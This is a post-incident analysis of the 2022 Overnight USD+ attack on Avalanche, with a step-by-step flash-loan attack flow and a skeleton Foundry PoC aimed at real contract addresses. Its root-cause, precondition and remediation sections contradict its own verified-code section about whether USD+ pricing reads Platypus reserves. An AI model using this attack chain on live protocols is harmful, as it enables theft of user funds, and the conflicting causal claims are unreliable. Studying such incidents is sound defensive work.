# Overnight — USD+ Platypus Liquidity Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-12-02 |
| **Protocol** | Overnight Finance (USD+) |
| **Chain** | Avalanche |
| **Loss** | Unconfirmed |
| **USD+ Token** | [0x73cb180bf0521828d8849bc8CF2B920918e23032](https://snowtrace.io/address/0x73cb180bf0521828d8849bc8CF2B920918e23032) |
| **USDC.e** | [0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664](https://snowtrace.io/address/0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664) |
| **Platypus SwapFlashLoan** | [0xED2a7edd7413021d440b09D654f3b87712abAB66](https://snowtrace.io/address/0xED2a7edd7413021d440b09D654f3b87712abAB66) |
| **Platypus Finance** | [0x66357dCaCe80431aee0A7507e2E361B7e2402370](https://snowtrace.io/address/0x66357dCaCe80431aee0A7507e2E361B7e2402370) |
| **Aave V2** | [0x4F01AeD16D97E3aB5ab2B501154DC9bb0F1A5A2C](https://snowtrace.io/address/0x4F01AeD16D97E3aB5ab2B501154DC9bb0F1A5A2C) |
| **Aave V3** | [0x794a61358D6845594F94dc1DB02A252b5b4814aD](https://snowtrace.io/address/0x794a61358D6845594F94dc1DB02A252b5b4814aD) |
| **Benqi Finance** | [0x486Af39519B4Dc9a7fCcd318217352830E8AD9b4](https://snowtrace.io/address/0x486Af39519B4Dc9a7fCcd318217352830E8AD9b4) |
| **qiUSDCn** | [0xB715808a78F6041E46d61Cb123C9B4A27056AE9C](https://snowtrace.io/address/0xB715808a78F6041E46d61Cb123C9B4A27056AE9C) |
| **Joe Router** | [0x60aE616a2155Ee3d9A68541Ba4544862310933d4](https://snowtrace.io/address/0x60aE616a2155Ee3d9A68541Ba4544862310933d4) |
| **Root Cause** | Reserve imbalance created via repeated add/remove liquidity cycles on the Platypus stableswap pool, combined with the USD+ `buy()`/`redeem()` mechanism and Benqi oracle manipulation to realize arbitrage profits |
| **CWE** | CWE-840: Business Logic Error |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/Overnight_exp.sol) |

---
## 1. Vulnerability Overview

Overnight Finance's USD+ was a stablecoin exchangeable for USDC.e via the Platypus stableswap pool on Avalanche. The attacker took out a large USDC.e flash loan (worth millions of dollars) from Aave V2 and activated a nested Aave V3 flash loan. The borrowed funds were deposited as collateral in Benqi (qiUSDCn) to manipulate the oracle price and borrow additional USDC.e. The attacker then maximized reserve imbalance through repeated add/remove liquidity cycles on the Platypus pool, and drained the pool balance via USDC.e → nUSD → DAI.e → USDT.e swaps under the imbalanced state. Arbitrage profits in USDC.e were realized through nUSD → USD+ exchange via USD+ `buy()` and reverse swaps.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable Platypus stableswap — allows imbalanced add/remove
contract PlatypusPool {
    // ❌ Allows immediate removal after imbalanced liquidity addition
    // → Enables favorable swap execution after distorting reserve ratio
    function addLiquidity(
        address token,
        uint256 amount,
        uint256 minimumLiquidity,
        address to,
        uint256 deadline
    ) external returns (uint256 liquidity) {
        // ❌ Allows imbalanced addition relative to current pool ratio
        _transferIn(token, amount);
        liquidity = _calculateLiquidity(token, amount);
        _mint(to, liquidity);
    }

    function removeLiquidity(
        address token,
        uint256 liquidity,
        uint256 minimumAmount,
        address to,
        uint256 deadline
    ) external returns (uint256 amount) {
        // ❌ Allows immediate removal of imbalanced liquidity
        // → Returns tokens with a distorted ratio upon removal
        _burn(msg.sender, liquidity);
        amount = _calculateAmount(token, liquidity);
        _transferOut(token, to, amount);
    }
}

// ✅ Correct pattern — liquidity lock period + imbalance restriction
contract SafePlatypusPool {
    mapping(address => uint256) public liquidityAddTime;

    function addLiquidity(address token, uint256 amount, ...) external returns (uint256) {
        // ✅ Validates minimum ratio maintenance
        require(_checkBalanceRatio(token, amount), "Imbalanced add");
        liquidityAddTime[msg.sender] = block.timestamp;
        // ...
    }

    function removeLiquidity(address token, uint256 liquidity, ...) external returns (uint256) {
        // ✅ Requires minimum waiting period after liquidity addition
        require(block.timestamp >= liquidityAddTime[msg.sender] + MIN_LOCK_TIME,
            "Lock period not ended");
        // ...
    }
}
```


### On-Chain Source Code

Source: **Etherscan-verified** (V2 API, chainid 43114) — Exchange `0x7dc48fec48cfd5448a54915ae0b1c30a3ce57502` (implementation of proxy `0x73cb180bf0521828d8849bc8CF2B920918e23032`)

Note: The USD+ token address `0x73cb180bf0521828d8849bc8CF2B920918e23032` is an ERC1967 proxy. The logic contract at `0x7dc48fec48cfd5448a54915ae0b1c30a3ce57502` (ContractName: Exchange) is verified. The real `buy()` and `redeem()` functions use a **1:1 decimal-adjusted rate** — NOT Platypus spot price. The actual attack vector was Platypus pool reserve manipulation enabling favorable direct swaps on that pool, with USD+ `buy()` used as an entry point to acquire USD+ cheaply via the imbalanced Platypus pool (not via a manipulated exchange rate in the Exchange contract itself).

```solidity
function buy(address _asset, uint256 _amount) external whenNotPaused oncePerBlock returns (uint256) {
    return _buy(_asset, _amount, "");
}

function _buy(address _asset, uint256 _amount, string memory _referral) internal returns (uint256) {
    require(_asset == address(usdc), "Only asset available for buy");

    uint256 currentBalance = IERC20(_asset).balanceOf(msg.sender);
    require(currentBalance >= _amount, "Not enough tokens to buy");

    require(_amount > 0, "Amount of asset is zero");

    uint256 usdPlusAmount;
    uint256 assetDecimals = IERC20Metadata(address(_asset)).decimals();
    uint256 usdPlusDecimals = usdPlus.decimals();
    if (assetDecimals > usdPlusDecimals) {
        usdPlusAmount = _amount / (10 ** (assetDecimals - usdPlusDecimals));
    } else {
        usdPlusAmount = _amount * (10 ** (usdPlusDecimals - assetDecimals));
    }

    require(usdPlusAmount > 0, "Amount of USD+ is zero");

    IERC20(_asset).transferFrom(msg.sender, address(portfolioManager), _amount);
    portfolioManager.deposit(IERC20(_asset), _amount);

    uint256 buyFeeAmount;
    uint256 buyAmount;
    if (!hasRole(FREE_RIDER_ROLE, msg.sender)) {
        buyFeeAmount = (usdPlusAmount * buyFee) / buyFeeDenominator;
        buyAmount = usdPlusAmount - buyFeeAmount;
        emit PaidBuyFee(buyAmount, buyFeeAmount);
    } else {
        buyAmount = usdPlusAmount;
    }

    usdPlus.mint(msg.sender, buyAmount);  // ❌ mints at 1:1 rate regardless of Platypus pool state

    emit EventExchange("mint", buyAmount, buyFeeAmount, msg.sender, _referral);

    return buyAmount;
}

function redeem(address _asset, uint256 _amount) external whenNotPaused oncePerBlock returns (uint256) {
    require(_asset == address(usdc), "Only asset available for redeem");

    require(_amount > 0, "Amount of USD+ is zero");

    uint256 assetAmount;
    uint256 assetDecimals = IERC20Metadata(address(_asset)).decimals();
    uint256 usdPlusDecimals = usdPlus.decimals();
    if (assetDecimals > usdPlusDecimals) {
        assetAmount = _amount * (10 ** (assetDecimals - usdPlusDecimals));
    } else {
        assetAmount = _amount / (10 ** (usdPlusDecimals - assetDecimals));
    }

    require(assetAmount > 0, "Amount of asset is zero");

    uint256 redeemFeeAmount;
    uint256 redeemAmount;
    if (!hasRole(FREE_RIDER_ROLE, msg.sender)) {
        redeemFeeAmount = (assetAmount * redeemFee) / redeemFeeDenominator;
        redeemAmount = assetAmount - redeemFeeAmount;
        emit PaidRedeemFee(redeemAmount, redeemFeeAmount);
    } else {
        redeemAmount = assetAmount;
    }

    uint256 unstakedAmount = portfolioManager.withdraw(IERC20(_asset), redeemAmount);

    usdPlus.burn(msg.sender, _amount);

    require(
        IERC20(_asset).balanceOf(address(this)) >= unstakedAmount,
        "Not enough for transfer unstakedAmount"
    );
    IERC20(_asset).transfer(msg.sender, unstakedAmount);  // ❌ withdraws from portfolioManager at 1:1

    emit EventExchange("redeem", redeemAmount, redeemFeeAmount, msg.sender, "");

    return unstakedAmount;
}
```

**Why it is exploitable (identify the bug from the code):**
- Contrary to earlier reconstruction, the verified Exchange contract does NOT read Platypus spot reserves. Both `buy()` and `redeem()` use a fixed 1:1 decimal-adjusted rate.
- The actual exploit leveraged Platypus pool imbalance directly: by manipulating Platypus reserves via large Aave-funded swaps, the attacker executed favorable USDC.e → nUSD → DAI.e/USDT.e swaps at distorted ratios on the Platypus pool itself.
- The USD+ Exchange's `buy()` function is exploitable in the sense that it always mints at 1:1 regardless of external market conditions — if the attacker can acquire USDC.e cheaply (via pool manipulation), they can mint USD+ at parity and redeem for more USDC.e than the market price, capturing the spread.
- The `oncePerBlock` modifier provides minimal protection as flash loans execute within a single block, and the Exchange lacks any circuit breaker or slippage guard tied to Platypus pool health.

```solidity
// ✅ Fix: add a circuit breaker that checks Platypus pool health before allowing buy/redeem
// ✅ Fix: consult a TWAP or Chainlink oracle to validate that USDC.e ≈ 1 USD before exchange
function _buy(address _asset, uint256 _amount, string memory _referral) internal returns (uint256) {
    // ✅ Reject if the Platypus pool is severely imbalanced (detected via TWAP deviation)
    require(IOracle(oracle).getDeviation(usdc, usdPlus) < MAX_DEVIATION, "Pool imbalanced");
    // ... rest of logic ...
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Aave V2 flash loan: large amount of USDC.e
    │
    ├─[2] Activate Aave V3 nested flash loan
    │
    ├─[3] USDC.e → qiUSDCn (Benqi) collateral deposit
    │       Enter Benqi market
    │
    ├─[4] Benqi oracle manipulation → borrow additional USDC.e
    │       Overborrow USDC.e from qiUSDC
    │
    ├─[5] Repeated add/remove liquidity on Platypus pool
    │       Distort reserves via imbalanced liquidity
    │
    ├─[6] USDC.e → nUSD swap (exploiting Platypus imbalance)
    │
    ├─[7] nUSD → DAI.e → USDT.e swaps (pool drain)
    │       Favorable exchange at manipulated ratio
    │
    ├─[8] USD+ buy() → nUSD→USD+ exchange
    │       Acquire USD+
    │
    ├─[9] nUSD/DAI.e/USDT.e → USDC.e reverse swaps
    │       Recover USDC.e at favorable ratio
    │
    ├─[10] Repay Benqi borrow + withdraw qiUSDCn
    │
    ├─[11] Swap Platypus profits to USDC.e
    │
    ├─[12] Repay Aave V3 flash loan
    │
    ├─[13] Repay Aave V2 flash loan
    │
    └─[14] Net profit: USDC.e arbitrage gains
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IUSDPlus {
    function buy(address asset, uint256 amount) external returns (uint256);
    function redeem(address asset, uint256 amount) external returns (uint256);
}

interface IPlatypus {
    function deposit(address token, uint256 amount, address to, uint256 deadline)
        external returns (uint256);
    function withdraw(address token, uint256 liquidity, uint256 minimumAmount,
        address to, uint256 deadline) external returns (uint256);
    function swap(address fromToken, address toToken, uint256 fromAmount,
        uint256 minimumToAmount, address to, uint256 deadline)
        external returns (uint256, uint256);
}

interface ISwapFlashLoan {
    function flashLoan(
        address receiver, address token, uint256 amount, bytes calldata params
    ) external;
}

interface IAaveFlashloan {
    function flashLoan(
        address receiver, address[] calldata assets, uint256[] calldata amounts,
        uint256[] calldata modes, address onBehalfOf, bytes calldata params, uint16 referral
    ) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract OvernightExploit is Test {
    IERC20        USDCe    = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    IUSDPlus      usdPlus  = IUSDPlus(0x73cb180bf0521828d8849bc8CF2B920918e23032);
    IPlatypus     platypus = IPlatypus(0x66357dCaCe80431aee0A7507e2E361B7e2402370);
    ISwapFlashLoan flashLoan = ISwapFlashLoan(0xED2a7edd7413021d440b09D654f3b87712abAB66);
    IAaveFlashloan aaveV2  = IAaveFlashloan(0x4F01AeD16D97E3aB5ab2B501154DC9bb0F1A5A2C);

    function setUp() public {
        vm.createSelectFork("avax");
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDC.e", USDCe.balanceOf(address(this)), 6);

        // [Step 1] Aave V2 large flash loan
        address[] memory assets = new address[](1);
        assets[0] = address(USDCe);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = USDCe.balanceOf(/* avUSDC */address(0));
        uint256[] memory modes = new uint256[](1);
        aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

        emit log_named_decimal_uint("[End] USDC.e", USDCe.balanceOf(address(this)), 6);
    }

    function executeOperation(
        address[] calldata, uint256[] calldata amounts,
        uint256[] calldata premiums, address, bytes calldata
    ) external returns (bool) {
        USDCe.approve(address(platypus), type(uint256).max);

        // [Step 5] Platypus repeated add/remove liquidity — create reserve imbalance
        for (uint256 i = 0; i < 5; i++) {
            // ⚡ Imbalanced liquidity addition + immediate removal → reserve distortion
            platypus.deposit(address(USDCe), amounts[0] / 10, address(this), block.timestamp);
            platypus.withdraw(address(USDCe), /* lpAmount */0, 0, address(this), block.timestamp);
        }

        // [Steps 6–7] Favorable swaps against imbalanced reserves
        platypus.swap(
            address(USDCe), /* nUSD */address(0),
            USDCe.balanceOf(address(this)) / 3, 0, address(this), block.timestamp
        );

        // [Step 8] Buy USD+
        USDCe.approve(address(usdPlus), type(uint256).max);
        usdPlus.buy(address(USDCe), USDCe.balanceOf(address(this)) / 4);

        // [Step 9] Recover USDC.e via reverse swaps
        // ... nUSD → USDC.e, DAI.e → USDC.e, etc. ...

        // Repay Aave V2 flash loan
        USDCe.approve(address(aaveV2), amounts[0] + premiums[0]);
        return true;
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Platypus repeated add/remove liquidity reserve imbalance + USD+ price manipulation |
| **CWE** | CWE-840: Business Logic Error |
| **OWASP DeFi** | AMM reserve manipulation + composite DeFi vulnerability |
| **Attack Vector** | Aave V2/V3 multiple flash loans → Benqi oracle manipulation → Platypus repeated add/remove → USD+ buy/redeem arbitrage |
| **Preconditions** | Platypus allows immediate imbalanced add/remove; USD+ price depends on Platypus spot ratio |
| **Impact** | USDC.e arbitrage profits (scale unconfirmed) |

---
## 6. Remediation Recommendations

1. **Liquidity lock period**: Prohibit liquidity removal for at least 1 block after addition to prevent immediate add/remove cycles within a flash loan.
2. **Imbalanced liquidity restriction**: Restrict or apply additional fees to liquidity additions that significantly deviate from the current pool ratio.
3. **USD+ price oracle hardening**: Set the USD+ to USDC.e exchange rate based on TWAP or an external oracle rather than the Platypus spot price.
4. **Flash loan detection**: Add an emergency pause mechanism that detects and blocks the pattern of flash loan + liquidity manipulation + USD+ exchange within the same transaction.

---
## 7. Lessons Learned

- **Repeated liquidity attacks on stableswap AMMs**: Stableswap pools like Platypus are more sensitive to reserve imbalance than general AMMs. Allowing immediate add/remove cycles enables reserve distortion within a single transaction.
- **Composite protocol attack chain**: This was a four-stage composite attack chaining Aave (flash loan) → Benqi (oracle manipulation) → Platypus (reserve manipulation) → USD+ (price arbitrage). Each protocol may be individually secure, yet their combination creates new attack surfaces.
- **Stablecoin price stability assumptions**: USD+ assumed that its exchange ratio on the Platypus pool would remain close to 1:1, but this assumption could be broken through pool reserve manipulation. Stablecoin protocols must independently verify the manipulation resistance of their underlying pools.